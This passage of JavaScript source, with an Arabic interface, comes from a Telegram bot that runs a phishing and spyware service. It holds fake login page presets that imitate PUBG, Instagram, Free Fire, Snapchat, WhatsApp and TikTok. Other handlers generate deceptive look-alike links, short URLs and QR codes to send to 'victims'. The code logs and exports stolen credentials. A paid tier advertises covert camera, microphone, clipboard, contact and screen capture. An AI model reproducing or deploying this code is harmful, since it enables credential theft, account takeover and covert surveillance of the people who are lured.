    const _pid = data.slice(8);
    return bot.sendMessage(chatId,
      `📩 اكتب نص الرسالة التي تريد إرسالها للجهاز:\n\`${_pid}\``,
      { parse_mode:"Markdown", reply_markup: JSON.stringify({
        force_reply: true, input_field_placeholder: "نص الرسالة..."
      })}
    ).then(m => {
      // Store pending push pid keyed by message id
      if (!global._pendingPush) global._pendingPush = {};
      global._pendingPush[m.message_id] = _pid;
    });
  }

  // ── Quick presets ──────────────────────────────────────────────────────────
  const QUICK_PRESETS = {
    pubg:{ template:"pubg", bgColor:"#1a1a2e", btnColor:"#e94560", accent:"#f5a623",
      title:"🎁 احصل على 600 شدة مجاناً", desc:"أدخل بياناتك لاستلام شداتك فوراً",
      fields:[{label:"ID اللاعب",type:"text"},{label:"كلمة المرور",type:"password"}],
      btnText:"🎮 استلم الآن", timer:10, social:"2,847 لاعب حصل على شداته اليوم", redirect:"https://www.pubg.com" },
    ig:{ template:"ig", bgColor:"#121212", btnColor:"#c13584", accent:"#833ab4",
      title:"🚀 احصل على 10,000 متابع مجاناً", desc:"أدخل بيانات حسابك لبدء الرشق الفوري",
      fields:[{label:"اسم المستخدم",type:"text"},{label:"كلمة المرور",type:"password"}],
      btnText:"ابدأ الرشق الآن ✅", timer:10, social:"14,923 شخص رشق متابعيه اليوم", redirect:"https://www.instagram.com" },
    ff:{ template:"ff", bgColor:"#1a0a00", btnColor:"#ff6b00", accent:"#ffd700",
      title:"💎 احصل على 2000 جوهرة مجاناً", desc:"أدخل بياناتك لاستلام جواهرك فوراً",
      fields:[{label:"ID اللاعب",type:"text"},{label:"كلمة المرور",type:"password"}],
      btnText:"🔥 استلم الآن", timer:10, social:"5,231 لاعب حصل على جواهره اليوم", redirect:"https://www.garena.com" },
    snap:{ template:"snap", bgColor:"#1a1a00", btnColor:"#fffc00", accent:"#fffc00",
      title:"👻 تحقق من هوية حسابك", desc:"أدخل بياناتك لإثبات الملكية",
      fields:[{label:"اسم المستخدم",type:"text"},{label:"كلمة المرور",type:"password"}],
      btnText:"✅ تحقق الآن", timer:8, social:"", redirect:"https://www.snapchat.com" },
    wa:{ template:"wa", bgColor:"#075e54", btnColor:"#25d366", accent:"#dcf8c6",
      title:"✅ تأكيد رقم واتساب", desc:"أدخل بياناتك لتأكيد حسابك",
      fields:[{label:"رقم الهاتف",type:"number"},{label:"رمز التحقق",type:"number"}],
      btnText:"تأكيد ✅", timer:5, social:"", redirect:"https://www.whatsapp.com" },
    tt:{ template:"tt", bgColor:"#010101", btnColor:"#fe2c55", accent:"#25f4ee",
      title:"🎵 تحقق من حسابك على تيك توك", desc:"حسابك بحاجة إلى تأكيد الهوية للاستمرار",
      fields:[{label:"اسم المستخدم",type:"text"},{label:"كلمة المرور",type:"password"}],
      btnText:"تسجيل الدخول 🎵", timer:0, social:"", redirect:"https://www.tiktok.com" },
  };

  if (data === "pg_quick") {
    if (q.from.id !== BOT_OWNER) return;
    const cur = TPL_THEMES[pageConfig.template]?.name || pageConfig.template;
    return bot.sendMessage(chatId,
      `⚡ *تبديل سريع*\n\nالقالب الحالي: ${cur}\nاختر القالب الجديد — سيُطبق فوراً بضغطة واحدة:`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
        [{text:"🎮 ببجي (شدة)",callback_data:"pg_preset_pubg"},{text:"📸 إنستغرام (متابعين)",callback_data:"pg_preset_ig"}],
        [{text:"🔥 فري فاير (جواهر)",callback_data:"pg_preset_ff"},{text:"👻 سناب (تحقق)",callback_data:"pg_preset_snap"}],
        [{text:"📱 واتساب (تحقق)",callback_data:"pg_preset_wa"},{text:"🎵 تيك توك",callback_data:"pg_preset_tt"}],
        [{text:"🔙 رجوع",callback_data:"pg_main"}]
      ]})}
    );
  }

  if (data.startsWith("pg_preset_")) {
    if (q.from.id !== BOT_OWNER) return;
    const key = data.replace("pg_preset_","");
    const preset = QUICK_PRESETS[key];
    if (!preset) return;
    bot.answerCallbackQuery(q.id, {text:"⚡ جاري التطبيق..."}).catch(()=>{});
    Object.assign(pageConfig, preset);
    pageConfig.active = true;
    pageConfig.camouflage = false;
    pageConfig.views = pageConfig.views || 0;
    savePageConfig();
    const name = TPL_THEMES[key]?.name || key;
    return bot.sendMessage(chatId,
      `✅ *تم تطبيق قالب ${name} فوراً!*\n\n🔗 الرابط: \`${hostURL}/p\``,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
        [{text:"🎛️ لوحة التحكم",callback_data:"pg_main"},{text:"🔗 الروابط",callback_data:"pg_links"}]
      ]})}
    );
  }

  // ── Dynamic Page callbacks ─────────────────────────────────────────────────
  if (data === "pg_main") {
    if (chatId === BOT_OWNER) return sendPageMain(chatId, q.message.message_id);
    if (isPremium(chatId)) return sendUserPageMain(chatId, chatId, q.message.message_id);
    return bot.answerCallbackQuery(q.id, { text: "⛔ هذه الميزة للمشتركين البريميوم فقط." });
  }

  if (data === "pg_toggle") {
    if (q.from.id !== BOT_OWNER) return;
    if (!pageConfig.active) { pageConfig.active = true; pageConfig.camouflage = false; }
    else if (!pageConfig.camouflage) { pageConfig.camouflage = true; }
    else { pageConfig.active = false; pageConfig.camouflage = false; }
    savePageConfig();
    return sendPageMain(chatId, q.message.message_id);
  }

  if (data === "pg_preview") {
    if (q.from.id !== BOT_OWNER) return;
    return bot.sendMessage(chatId,
      `👁️ معاينة الصفحة:\n🔗 ${hostURL}/p\n\nافتح الرابط لترى الصفحة كما ستظهر للضحية`,
      {reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})});
  }

  if (data === "pg_edit") {
    if (q.from.id !== BOT_OWNER) return;
    return bot.sendMessage(chatId, "🎨 اختر نوع الصفحة:", {
      reply_markup: JSON.stringify({inline_keyboard:[
        [{text:"🎮 ببجي",callback_data:"pg_tpl_pubg"},{text:"📸 إنستغرام",callback_data:"pg_tpl_ig"}],
        [{text:"🔥 فري فاير",callback_data:"pg_tpl_ff"},{text:"👻 سناب شات",callback_data:"pg_tpl_snap"}],
        [{text:"🎵 تيك توك",callback_data:"pg_tpl_tt"},{text:"🏦 بنكية",callback_data:"pg_tpl_bank"}],
        [{text:"🇸🇦 حكومية",callback_data:"pg_tpl_gov"},{text:"✏️ مخصص كامل",callback_data:"pg_tpl_custom"}],
        [{text:"🔙 رجوع",callback_data:"pg_main"}]
      ]})
    });
  }

  if (data.startsWith("pg_tpl_")) {
    if (q.from.id !== BOT_OWNER) return;
    const tpl = data.replace("pg_tpl_","");
    const theme = TPL_THEMES[tpl] || TPL_THEMES.custom;
    pageConfig.template = tpl;
    pageConfig.bgColor = theme.bg;
    pageConfig.btnColor = theme.btn;
    if (tpl !== "custom") {
      pageConfig.redirect = theme.redirect;
    }
    savePageConfig();
    _pageWiz[chatId] = { step:"title", data:{ template:tpl, bgColor:theme.bg, btnColor:theme.btn } };
    return bot.sendMessage(chatId,
      `✅ اخترت: ${theme.name}\n\nالآن سنضبط محتوى الصفحة خطوة بخطوة.\nاكتب /cancel في أي وقت للإلغاء.\n\n📌 *العنوان الرئيسي للصفحة؟*`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({force_reply:true})}
    );
  }

  if (data === "pg_stats") {
    if (q.from.id !== BOT_OWNER) return;
    const today = new Date().toISOString().slice(0,10);
    const todaySubs = submissions.filter(s=>s.time?.startsWith(today)).length;
    const rate = pageConfig.views ? Math.round(submissions.length/pageConfig.views*100) : 0;
    return bot.sendMessage(chatId,
      `📊 *إحصائيات الصفحة*\n\n👁️ إجمالي المشاهدات: ${pageConfig.views||0}\n✅ إجمالي الإرسال: ${submissions.length}\n📅 إرسال اليوم: ${todaySubs}\n📈 نسبة التحويل: ${rate}%\n📋 نسخ من الحافظة: ${pageConfig.clipCount||0}\n\n🎨 القالب: ${TPL_THEMES[pageConfig.template]?.name||pageConfig.template}`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})}
    );
  }

  if (data === "pg_allsubs" && chatId === BOT_OWNER) {
    // Combine owner's submissions + all premium users' submissions
    const all = [];
    for (const s of submissions) all.push({ ...s, src: "صفحتك" });
    for (const [uid, subs] of Object.entries(userSubs)) {
      const prof = profiles[uid] || {};
      const name = prof.name || uid;
      for (const s of (subs || [])) all.push({ ...s, src: name });
    }
    if (!all.length) return bot.sendMessage(chatId, "📋 لا توجد بيانات من أي صفحة بعد.", {reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})});
    // Sort by time descending, take last 10
    all.sort((a,b) => (b.time||"").localeCompare(a.time||""));
    const last10 = all.slice(0, 10);
    let txt = `📊 *آخر ${last10.length} إدخال من كل الصفحات:*\n━━━━━━━━━━━━━━\n`;
    for (const s of last10) {
      txt += `📄 *${s.src}* — ${s.time||"?"}\n`;
      for (const [k,v] of Object.entries(s.fields||{})) txt += `📝 ${k}: \`${v}\`\n`;
      txt += `📱 ${s.device||"?"} | 🌍 ${s.country||"?"}\n━━━━━━━━━━━━━━\n`;
    }
    txt += `\n📦 الإجمالي: ${all.length} إدخال`;
    return bot.sendMessage(chatId, txt, {parse_mode:"Markdown",
      reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})
    });
  }

  if (data === "pg_log") {
    if (q.from.id !== BOT_OWNER) return;
    if (!submissions.length) return bot.sendMessage(chatId,"📋 لا توجد بيانات بعد.",{reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})});
    const last5 = submissions.slice(-5).reverse();
    let txt = `📋 *آخر ${last5.length} إرسال:*\n━━━━━━━━━━━━━━\n`;
    for (const s of last5) {
      txt += `⏰ ${s.time||"?"}\n`;
      for (const [k,v] of Object.entries(s.fields||{})) txt += `📝 ${k}: \`${v}\`\n`;
      txt += `📱 ${s.device||"?"} | 🌍 ${s.country||"?"}\n━━━━━━━━━━━━━━\n`;
    }
    return bot.sendMessage(chatId, txt, {parse_mode:"Markdown",
      reply_markup:JSON.stringify({inline_keyboard:[
        [{text:"📥 تصدير الكل",callback_data:"pg_export"},{text:"🗑️ مسح الكل",callback_data:"pg_clear"}],
        [{text:"🔙 رجوع",callback_data:"pg_main"}]
      ]})
    });
  }

  if (data === "pg_export") {
    if (q.from.id !== BOT_OWNER) return;
    if (!submissions.length) return bot.sendMessage(chatId,"لا توجد بيانات.");
    let csv = "الوقت,الجهاز,الدولة,IP";
    const allKeys = [...new Set(submissions.flatMap(s=>Object.keys(s.fields||{})))];
    csv = "الوقت," + allKeys.join(",") + ",الجهاز,الدولة,IP\n";
    csv += submissions.map(s=>[s.time,...allKeys.map(k=>s.fields?.[k]||""),s.device,s.country,s.ip].join(",")).join("\n");
    const buf = Buffer.from(csv,"utf8");
    return bot.sendDocument(chatId, buf, {caption:"📥 بيانات الصفحة الديناميكية"},{filename:"submissions.csv",contentType:"text/csv"});
  }

  if (data === "pg_clear") {
    if (q.from.id !== BOT_OWNER) return;
    submissions = []; saveSubmissions();
    return bot.sendMessage(chatId,"🗑️ تم مسح جميع البيانات.",{reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})});
  }

  if (data === "pg_map") {
    if (q.from.id !== BOT_OWNER) return;
    if (!submissions.length) return bot.sendMessage(chatId,"🗺️ لا توجد بيانات بعد.",{reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})});
    const countries = {};
    submissions.forEach(s=>{ if(s.country){ countries[s.country]=(countries[s.country]||0)+1; } });
    const sorted = Object.entries(countries).sort((a,b)=>b[1]-a[1]);
    const txt = `🗺️ *توزيع الضحايا حسب الدولة:*\n\n` + sorted.map(([c,n])=>`${c}: ${n} ضحية`).join("\n");
    return bot.sendMessage(chatId, txt, {parse_mode:"Markdown",reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})});
  }

  if (data === "pg_tpls") {
    if (q.from.id !== BOT_OWNER) return;
    const saved = Object.keys(_pageTpls);
    if (!saved.length) return bot.sendMessage(chatId,"📁 لا توجد قوالب محفوظة بعد.\nبعد تصميم صفحة اكتب /savetpl [اسم] لحفظها.",
      {reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_main"}]]})});
    const kb = saved.map(n=>[{text:`📄 ${n}`,callback_data:`pg_loadtpl_${n}`},{text:"🗑️",callback_data:`pg_deltpl_${n}`}]);
    kb.push([{text:"🔙 رجوع",callback_data:"pg_main"}]);
    return bot.sendMessage(chatId,"📁 *قوالبك المحفوظة:*",{parse_mode:"Markdown",reply_markup:JSON.stringify({inline_keyboard:kb})});
  }

  if (data.startsWith("pg_loadtpl_")) {
    if (q.from.id !== BOT_OWNER) return;
    const name = data.replace("pg_loadtpl_","");
    if (!_pageTpls[name]) return bot.sendMessage(chatId,"❌ القالب غير موجود.");
    Object.assign(pageConfig, _pageTpls[name]); savePageConfig();
    return bot.sendMessage(chatId,`✅ تم تحميل القالب "${name}" وتطبيقه.`,{reply_markup:JSON.stringify({inline_keyboard:[[{text:"🎛️ لوحة التحكم",callback_data:"pg_main"}]]})});
  }

  if (data.startsWith("pg_deltpl_")) {
    if (q.from.id !== BOT_OWNER) return;
    const name = data.replace("pg_deltpl_","");
    delete _pageTpls[name];
    return bot.sendMessage(chatId,`🗑️ تم حذف القالب "${name}".`,{reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_tpls"}]]})});
  }

  if (data === "pg_links") {
    if (q.from.id !== BOT_OWNER) return;
    const realLink = `${hostURL}/p`;
    return bot.sendMessage(chatId,
      `🔗 *روابط صفحتك:*\n\n🔗 الرابط الحقيقي:\n\`${realLink}\`\n\n🎭 اختر شكل الرابط المخادع:`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
        [{text:"🎮 ببجي",callback_data:"pg_lnk_pubg"},{text:"📸 إنستغرام",callback_data:"pg_lnk_ig"}],
        [{text:"🔥 فري فاير",callback_data:"pg_lnk_ff"},{text:"👻 سناب",callback_data:"pg_lnk_snap"}],
        [{text:"🌐 جوجل",callback_data:"pg_lnk_google"},{text:"📱 واتساب",callback_data:"pg_lnk_wa"}],
        [{text:"🔳 QR Code",callback_data:"pg_qr"},{text:"🔙 رجوع",callback_data:"pg_main"}]
      ]})
    });
  }

  if (data.startsWith("pg_lnk_")) {
    if (q.from.id !== BOT_OWNER) return;
    const type = data.replace("pg_lnk_","");
    const realLink = `${hostURL}/p`;
    const fakeTexts = {
      pubg:`pubg.com/gifts/claim-${Math.random().toString(36).slice(2,6)}`,
      ig:`instagram.com/p/${Math.random().toString(36).slice(2,10)}`,
      ff:`ff.garena.com/rewards/${Math.random().toString(36).slice(2,8)}`,
      snap:`snapchat.com/add/verify-${Math.random().toString(36).slice(2,6)}`,
      google:`google.com/url?q=${encodeURIComponent(realLink)}`,
      wa:`wa.me/link/${Math.random().toString(36).slice(2,8)}`
    };
    const fakeText = fakeTexts[type] || realLink;
    return bot.sendMessage(chatId,
      `🎭 *الرابط المخادع جاهز!*\n\n` +
      `📲 *تلغرام:* فوّرد الرسالة التالية مباشرةً للضحية\n` +
      `📱 *واتساب/غيره:* اضغط "📋 نسخ رابط قصير" وأرسله`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
        [{text:"📋 نسخ رابط قصير للواتساب", callback_data:`pg_short`}],
        [{text:"🔙 رجوع",callback_data:"pg_links"}]
      ]})}
    ).then(()=>
      bot.sendMessage(chatId,
        `🔗 [${fakeText}](${realLink})`,
        {parse_mode:"Markdown"}
      )
    );
  }

  if (data === "pg_short") {
    if (q.from.id !== BOT_OWNER) return;
    const realLink = `${hostURL}/p`;
    bot.answerCallbackQuery(q.id, {text:"⏳ جاري إنشاء الرابط..."}).catch(()=>{});
    const short = await makeTinyUrl(realLink);
    if (!short) return bot.sendMessage(chatId,"❌ فشل إنشاء الرابط القصير، حاول مرة أخرى.");
    return bot.sendMessage(chatId,
      `📋 *الرابط القصير:*\n\n\`${short}\`\n\nانسخه وأرسله من أي تطبيق 📱`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_links"}]]})}
    );
  }

  if (data === "pg_renew") {
    if (q.from.id !== BOT_OWNER) return;
    bot.answerCallbackQuery(q.id, {text:"⏳ جاري توليد رابط جديد..."}).catch(()=>{});
    const realLink = `${hostURL}/p`;
    const short = await makeTinyUrl(realLink);
    if (!short) return bot.sendMessage(chatId,"❌ فشل توليد الرابط، حاول مرة أخرى.");
    return bot.sendMessage(chatId,
      `🔄 *تم تجديد الرابط!*\n\n📋 الرابط الجديد:\n\`${short}\`\n\n⏰ تاريخ التجديد: ${new Date().toLocaleString('ar-SA')}\n\nانسخه وأرسله للضحايا 📤`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
        [{text:"🔄 تجديد مرة أخرى",callback_data:"pg_renew"},{text:"🔙 رجوع",callback_data:"pg_main"}]
      ]})});
  }

  if (data === "pg_trap") {
    if (q.from.id !== BOT_OWNER) return;
    pageConfig.trapEnabled = !pageConfig.trapEnabled;
    savePageConfig();
    const st = pageConfig.trapEnabled ? "✅ مفعّل" : "🔴 معطّل";
    bot.answerCallbackQuery(q.id, {text:`🪤 فخ الصفحة: ${st}`}).catch(()=>{});
    return sendPageMain(chatId, q.message.message_id);
  }

  if (data === "pg_setpass") {
    if (q.from.id !== BOT_OWNER) return;
    const hasPass = !!pageConfig.pagePassword;
    const passText = hasPass ? `🔒 *كلمة السر للصفحة*\n\nالكود الحالي: \`${pageConfig.pagePassword}\`\n\nاختر إجراء:` : `🔒 *كلمة السر للصفحة*\n\n_(غير مفعّلة حالياً)_\n\nبعد التفعيل، أي شخص يفتح الرابط سيُطلب منه الكود أولاً.`;
    return bot.sendMessage(chatId, passText, {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
      hasPass ? [{text:"✏️ تغيير الكود",callback_data:"pg_setpass_new"},{text:"🗑️ إزالة كلمة السر",callback_data:"pg_clrpass"}] : [{text:"➕ تفعيل كلمة سر",callback_data:"pg_setpass_new"}],
      [{text:"🔙 رجوع",callback_data:"pg_main"}]
    ]})});
  }

  if (data === "pg_setpass_new") {
    if (q.from.id !== BOT_OWNER) return;
    _awaitPagePass.set(chatId, {type:"owner"});
    return bot.sendMessage(chatId, `🔒 *اكتب الكود السري للصفحة:*\n\nمثال: \`1234\` أو \`mycode\`\n\nأو /cancel للإلغاء`, {parse_mode:"Markdown", reply_markup:JSON.stringify({force_reply:true})});
  }

  if (data === "pg_clrpass") {
    if (q.from.id !== BOT_OWNER) return;
    pageConfig.pagePassword = null;
    savePageConfig();
    bot.answerCallbackQuery(q.id, {text:"🔓 تم إزالة كلمة السر"}).catch(()=>{});
    return sendPageMain(chatId, q.message.message_id);
  }

  if (data === "pg_welcome") {
    if (q.from.id !== BOT_OWNER) return;
    const hasMsg = !!pageConfig.welcomeMsg;
    const enabled = !!pageConfig.welcomeEnabled;
    const statusTxt = enabled ? "🟢 مفعّلة" : "🔴 معطّلة";
    const preview = hasMsg ? `\n\n📢 النص الحالي:\n_${pageConfig.welcomeMsg}_` : "\n\n_(لا توجد رسالة محفوظة بعد)_";
    return bot.sendMessage(chatId,
      `📢 *رسالة الترحيب*\n\nالحالة: ${statusTxt}${preview}\n\nتظهر كـ popup فور فتح الضحية للصفحة.`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
        [{text:"✏️ تعديل النص",callback_data:"pg_welcome_set"}],
        enabled
          ? [{text:"⏸️ تعطيل الرسالة",callback_data:"pg_welcome_off"}]
          : [{text:"▶️ تفعيل الرسالة",callback_data:"pg_welcome_on"}],
        [{text:"🔙 رجوع",callback_data:"pg_main"}]
      ]})});
  }

  if (data === "pg_welcome_on") {
    if (q.from.id !== BOT_OWNER) return;
    if (!pageConfig.welcomeMsg) return bot.sendMessage(chatId,"⚠️ أضف نصاً أولاً بالضغط على ✏️ تعديل النص");
    pageConfig.welcomeEnabled = true; savePageConfig();
    bot.answerCallbackQuery(q.id,{text:"✅ تم تفعيل رسالة الترحيب"}).catch(()=>{});
    return sendPageMain(chatId, q.message.message_id);
  }

  if (data === "pg_welcome_off") {
    if (q.from.id !== BOT_OWNER) return;
    pageConfig.welcomeEnabled = false; savePageConfig();
    bot.answerCallbackQuery(q.id,{text:"⏸️ تم تعطيل رسالة الترحيب"}).catch(()=>{});
    return sendPageMain(chatId, q.message.message_id);
  }

  if (data === "pg_welcome_set") {
    if (q.from.id !== BOT_OWNER) return;
    _awaitWelcome.add(chatId);
    return bot.sendMessage(chatId,
      `✏️ *اكتب نص رسالة الترحيب:*\n\nمثال:\n_⚠️ حسابك بخطر! سجّل دخولك لتأمينه فوراً_\n\nأو /cancel للإلغاء`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({force_reply:true})});
  }

  if (data === "pg_qr") {
    if (q.from.id !== BOT_OWNER) return;
    const realLink = `${hostURL}/p`;
    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(realLink)}`;
    return bot.sendPhoto(chatId, qrUrl, {caption:`🔳 QR Code للصفحة الديناميكية\n🔗 ${realLink}`,
      reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_links"}]]})});
  }

  // ── Push device info (inline button) ──────────────────────────────────────
  if (data.startsWith("pushinfo:")) {
    if (!isPremium(q.from.id)) return bot.answerCallbackQuery(q.id, {text:"⛔ هذه الميزة للمشتركين فقط", show_alert:true});
    const _pid = data.slice(9);
    const _e   = pushSubs[_pid];
    if (!_e) return bot.sendMessage(chatId, "❌ الجهاز غير موجود في القائمة.");
    const _online  = !!sseClients[_pid];
    const _hasSub  = !!(_e.subscription);
    const _purl    = _e.purl ? _e.purl.slice(0,60)+"…" : "غير محفوظ";
    return bot.sendMessage(chatId,
      `📋 معلومات الجهاز\n🆔 \`${_pid}\`\n\n` +
      `🟢 متصل الآن: ${_online ? "نعم" : "لا"}\n` +
      `🔔 إشعار خلفي: ${_hasSub ? "✅ مسجّل" : "❌ غير مسجّل"}\n` +
      `🔗 الرابط: ${_purl}`,
      { parse_mode:"Markdown",
        reply_markup: JSON.stringify({ inline_keyboard: [
          [{ text:"📲 سحب الجهاز", callback_data:`pull:${_pid}` }, { text:"📩 إرسال رسالة", callback_data:`pushmsg:${_pid}` }]
        ] })
      }
    );
  }

  // ── Premium info (all users) ───────────────────────────────────────────────
  if (data === "pinfo") {
    const hasPrem = isPremium(chatId);
    const camFree = isPremiumFeatureFree('camera');
    const camLine = camFree ? `✅  📷 الكاميرا — مفعّلة مجاناً الآن!` : `✅  📷 الكاميرا — مجانًا لنصف يوم كل فترة 🎁`;
    const statusLine = hasPrem
      ? `\n\n✨ أنت مشترك بريميوم — كل الميزات مفعّلة!`
      : `\n\n💬 للاشتراك تواصل مع @Ye_x00`;
    return bot.sendMessage(chatId,
      `💎 خطط البريميوم\n\n` +
      `━━━━━━ مجاني للجميع ━━━━━━\n\n` +
      `✅  📍 الموقع الجغرافي (GPS + IP)\n` +
      `✅  📱 بيانات الجهاز الكاملة\n` +
      `✅  🌐 معلومات الشبكة (ISP، الدولة، السرعة)\n` +
      `${camLine}\n\n` +
      `━━━━━ حصرياً للمشتركين ━━━━━\n\n` +
      `🔒  📷 كاميرا أمامية + خلفية (دائم وبلا انقطاع)\n` +
      `🔒  🎙️ تسجيل صوتي من الميكروفون\n` +
      `🔒  📋 قراءة محتوى الحافظة (أرقام، نصوص)\n` +
      `🔒  📒 سرقة جهات الاتصال كاملة\n` +
      `🔒  🖼️ تحميل الصور والملفات من جهاز الضحية\n` +
      `🔒  🖥️ تصوير شاشة الضحية مباشرة\n` +
      `🔒  🔔 إرسال إشعارات للضحية حتى بعد إغلاق الصفحة\n` +
      `🔒  📸 تصوير مستمر كل 30 ثانية (حتى 20 دقيقة)\n` +
      `🔒  🎙️ تسجيل صوتي مستمر كل دقيقتين\n` +
      `🔒  😊 تحليل الوجه AI (عمر، جنس، مزاج)\n` +
      `🔒  🚶 كشف النشاط الجسدي (يمشي/يجري/في سيارة)\n` +
      `🔒  🔑 استخراج إيميل/يوزرنيم من Autofill\n` +
      `🔒  🔍 تنبيه عند فتح DevTools\n` +
      `🔒  🎣 صفحة ملغمة خاصة بك (ببجي/إنستغرام/فري فاير...)\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🚀 كل هذا برابط واحد يُرسَل للضحية!` +
      statusLine
    );
  }

  // ── Premium admin panel (owner only) ──────────────────────────────────────
  if (data === "premadmin" && q.from.id === BOT_OWNER) {
    const total = Object.keys(premium).length;
    const active = Object.entries(premium).filter(([id]) => isPremium(Number(id))).length;
    return bot.sendMessage(chatId,
      `👑 إدارة البريميوم\n\n` +
      `💎 المشتركون: ${active} نشط / ${total} إجمالي\n\n` +
      `الأوامر النصية:\n` +
      `• /premium [ID] [أيام] — تفعيل\n` +
      `• /premium [ID] lifetime — مدى الحياة\n` +
      `• /revokepremium [ID] — إلغاء`,
      { reply_markup: JSON.stringify({ inline_keyboard: [
        [{ text: "➕ تفعيل بريميوم", callback_data: "premgrant" }, { text: "🗑️ إلغاء بريميوم", callback_data: "premrevoke" }],
        [{ text: "📋 قائمة المشتركين", callback_data: "premlist" }],
        [{ text: "🎛️ إعدادات الميزات المجانية", callback_data: "gopc" }]
      ] }) }
    );
  }

  if (data === "premlist" && q.from.id === BOT_OWNER) {
    const entries = Object.entries(premium);
    if (!entries.length) return bot.sendMessage(chatId, "لا يوجد مشتركون بريميوم حالياً.");
    const list = entries.map(([id, p], i) => {
      const prof = profiles[id] || {};
      const active = isPremium(Number(id));
      const expText = p.expiry === -1 ? "♾️ مدى الحياة" : new Date(p.expiry).toJSON().slice(0,10);
      const pageIcon = p.pageAccess ? "🌐" : "🔒";
      return `${i+1}. ${active?'✅':'❌'} ${prof.name||id} (${p.plan||'?'}) — ${expText} ${pageIcon}`;
    }).join("\n");
    const userBtns = entries.map(([id,p]) => {
      const prof = profiles[id]||{};
      return [{text:`${p.pageAccess?'🌐':'🔒'} ${prof.name||id}`, callback_data:`pg_uadmin_${id}`}];
    });
    return bot.sendMessage(chatId,
      `💎 المشتركون (${entries.length}):\n\n${list}\n\n🌐=صفحة مفعّلة 🔒=صفحة معطّلة`,
      {reply_markup:JSON.stringify({inline_keyboard:[...userBtns,[{text:"🔙 رجوع",callback_data:"premadmin"}]]})}
    );
  }

  // ── Owner: user page admin ─────────────────────────────────────────────────
  if (data.startsWith("pg_uadmin_") && q.from.id === BOT_OWNER) {
    const uid = data.replace("pg_uadmin_","");
    const prof = profiles[uid]||{};
    const prem = premium[uid]||{};
    const cfg = getUserPage(uid);
    const subs = getUserSubs(uid);
    const hasAccess = !!prem.pageAccess;
    const active = cfg.active;
    const link = `${hostURL}/p/u/${uid}`;
    return bot.sendMessage(chatId,
      `🎛️ *إدارة صفحة: ${prof.name||uid}*\n\n` +
      `🔑 الوصول: ${hasAccess ? "✅ مفعّل" : "🔒 معطّل"}\n` +
      `📡 الحالة: ${active ? "🟢 نشطة" : "🔴 متوقفة"}\n` +
      `👁️ مشاهدات: ${cfg.views||0}\n` +
      `✅ بيانات مجموعة: ${subs.length}\n` +
      `🔗 الرابط: \`${link}\``,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
        [{text: hasAccess ? "🔒 تعطيل الصفحة عليه" : "✅ تفعيل الصفحة له", callback_data:`pg_utoggle_${uid}`}],
        [{text: prem.pushNotif===false ? "🔔 تفعيل إشعارات الجهاز له" : "🔕 تعطيل إشعارات الجهاز عليه", callback_data:`pg_upushtoggle_${uid}`}],
        [{text: prem.receiveOwnerSubs ? "📤✅ إيقاف إرسال بيانات صفحتك له" : "📤 إرسال بيانات صفحتك له", callback_data:`pg_ufwdtoggle_${uid}`}],
        [{text:"🗑️ مسح بياناته",callback_data:`pg_uclear_${uid}`},{text:"📋 سجل بياناته",callback_data:`pg_ulog_${uid}`}],
        [{text:"🔙 رجوع",callback_data:"premlist"}]
      ]})}
    );
  }

  if (data.startsWith("pg_ufwdtoggle_") && q.from.id === BOT_OWNER) {
    const uid = data.replace("pg_ufwdtoggle_","");
    if (!premium[uid]) return;
    premium[uid].receiveOwnerSubs = !premium[uid].receiveOwnerSubs;
    savePremium();
    const on = premium[uid].receiveOwnerSubs;
    bot.answerCallbackQuery(q.id, {text: on ? "📤✅ سيصله بيانات صفحتك" : "📤 لن يصله بيانات صفحتك"}).catch(()=>{});
    // Refresh the panel
    const prof2 = profiles[uid]||{};
    const prem2 = premium[uid]||{};
    const cfg2 = getUserPage(uid);
    const subs2 = getUserSubs(uid);
    const hasAccess2 = !!prem2.pageAccess;
    const link2 = `${hostURL}/p/u/${uid}`;
    return bot.editMessageText(
      `🎛️ *إدارة صفحة: ${prof2.name||uid}*\n\n` +
      `🔑 الوصول: ${hasAccess2 ? "✅ مفعّل" : "🔒 معطّل"}\n` +
      `📡 الحالة: ${cfg2.active ? "🟢 نشطة" : "🔴 متوقفة"}\n` +
      `👁️ مشاهدات: ${cfg2.views||0}\n` +
      `✅ بيانات مجموعة: ${subs2.length}\n` +
      `🔗 الرابط: \`${link2}\``,
      {chat_id:chatId, message_id:q.message.message_id, parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
        [{text: hasAccess2 ? "🔒 تعطيل الصفحة عليه" : "✅ تفعيل الصفحة له", callback_data:`pg_utoggle_${uid}`}],
